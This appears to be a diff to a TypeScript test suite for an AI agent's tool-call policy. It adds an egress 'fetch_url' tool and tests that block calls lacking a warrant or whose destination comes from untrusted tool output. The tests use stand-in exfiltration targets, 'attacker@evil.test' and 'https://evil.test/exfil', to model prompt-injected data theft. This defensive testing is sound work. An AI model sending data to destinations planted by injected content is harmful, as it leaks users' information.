@@ -7,6 +7,13 @@ import { issueWarrant, type UserIntent, type Warrant } from './warrant';
 const tools: readonly ToolDefinition[] = [
   { name: 'read_document', riskTier: 'READ_ONLY', description: 'Reads a document.' },
   {
+    name: 'fetch_url',
+    riskTier: 'READ_ONLY',
+    egress: true,
+    description: 'Fetches a URL.',
+    authorityParameters: ['url'],
+  },
+  {
     name: 'send_email',
     riskTier: 'SENSITIVE',
     description: 'Sends an email.',
@@ -208,6 +215,26 @@ describe('decideToolCall', () => {
         to: taint('attacker@evil.test', 'TOOL_RESULT'),
         body: taint('summary', 'TOOL_RESULT'),
       },
+    });
+    expect(decision.allowed).toBe(false);
+    expect(decision.allowed === false && decision.code).toBe(
+      'AUTHORITY_PARAMETER_FROM_CONTENT',
+    );
+  });
+
+  it('requires a warrant for an egress read even when the tier is READ_ONLY', () => {
+    const decision = decide(warrantFor({ requestedTools: ['read_document'] }), {
+      tool: 'fetch_url',
+      args: { url: taint('https://example.com', 'USER') },
+    });
+    expect(decision.allowed).toBe(false);
+    expect(decision.allowed === false && decision.code).toBe('NO_WARRANT_FOR_TOOL');
+  });
+
+  it('blocks an egress destination chosen by untrusted content', () => {
+    const decision = decide(warrantFor({ requestedTools: ['fetch_url'] }), {
+      tool: 'fetch_url',
+      args: { url: taint('https://evil.test/exfil', 'TOOL_RESULT') },
     });
     expect(decision.allowed).toBe(false);
     expect(decision.allowed === false && decision.code).toBe(
